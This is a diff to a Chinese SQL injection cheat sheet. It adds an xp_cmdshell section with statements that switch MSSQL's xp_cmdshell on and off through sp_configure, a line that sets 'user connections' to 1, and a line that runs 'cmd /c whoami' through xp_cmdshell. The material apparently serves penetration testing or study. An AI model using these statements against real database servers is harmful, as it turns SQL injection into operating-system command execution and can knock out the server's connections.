@@ -618,15 +618,27 @@ MSSQL所用的正则表达式并不是标准正则表达式 ，该表达式使�
 
 同理可以用相同的方法获取字段，值。这里就不再详细描述了。
 
+**xp_cmdshell**
+```sql
+-- SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。
+
+-- 关闭
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
+-- 开启
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+```
+```sql
+-- 标记message: 配置选项 ‘xp_cmdshell’ 不存在，也可能是高级选
+EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user connections',1;RECONFIGURE;--
+```
+
+```sql
+exec master..xp_cmdshell 'cmd /c whoami'
+```
+
 ---
 
 ## Oracle
 
 > JSP应用程序通常具有Oracle数据库。
-
-
-
-
-
-
 
